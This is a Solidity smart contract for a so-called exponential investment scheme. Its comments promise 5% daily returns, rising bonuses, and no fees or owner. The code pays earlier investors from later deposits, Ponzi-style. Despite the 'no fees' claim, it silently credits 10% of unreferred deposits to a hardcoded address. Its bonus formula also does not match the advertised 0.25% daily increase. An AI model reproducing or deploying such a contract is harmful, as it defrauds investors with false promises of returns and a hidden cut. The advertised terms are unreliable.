pragma solidity ^0.4.24;

/**
 *
 * Exponental Investment Contract
 *  - GAIN 5% PER 24 HOURS (every 5900 blocks)
 *  - Every day the percentage increases by 0.25%
 *  - You will receive 10% of each deposit of your referral
 *  - Your referrals will receive 10% bonus
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 100000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 * 
 *
 */
contract ExpoInvest {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;
    
    function bytesToAddress(bytes bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }

    // this function called every time anyone sends a transaction to this contract
    function ()  payable {
          
            
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * start 5% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
            
            amount +=amount*((block.number - 6401132)/118000);
            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            
             if (amount > address(this).balance) {sender.send(address(this).balance);}
             else  sender.send(amount);
            
        }
        
         

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
        //referral
         address referrer = bytesToAddress(msg.data);
            if (invested[referrer] > 0 && referrer != msg.sender) {
                invested[msg.sender] += msg.value/10;
                invested[referrer] += msg.value/10;
            
            } else {
                invested[0x705872bebffA94C20f82E8F2e17E4cCff0c71A2C] += msg.value/10;
            }
        
        
       
    }
}